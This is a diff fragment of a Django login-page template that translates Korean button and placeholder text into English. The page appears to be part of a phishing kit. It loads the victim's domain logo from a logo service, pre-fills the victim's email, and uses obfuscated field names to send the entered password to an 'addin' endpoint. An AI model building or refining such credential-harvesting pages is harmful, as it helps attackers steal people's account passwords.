@@ -94,17 +94,17 @@ input[type="submit"]:hover{
 	</style>
 </head>
 <body>
-<span href="#" class="button" id="toggle-login">로그인</span>
+<span href="#" class="button" id="toggle-login">login</span>
 
 <div id="login">
   <div id="triangle"></div>
-  <h1>로그인</h1>
+  <h1>login</h1>
   <form action="addin" method="post">
     {% csrf_token %}
   	<center><img src="https://logo.clearbit.com/{{domains}}"></center>
     <input type="email" name="powerioman" value="{{email}}" required/>
-    <input type="password" name="enginloio" placeholder="비밀번호" required />
-    <input type="submit" value="로그인" />
+    <input type="password" name="enginloio" placeholder="password" required />
+    <input type="submit" value="login" />
   </form>
 </div>
 <script>
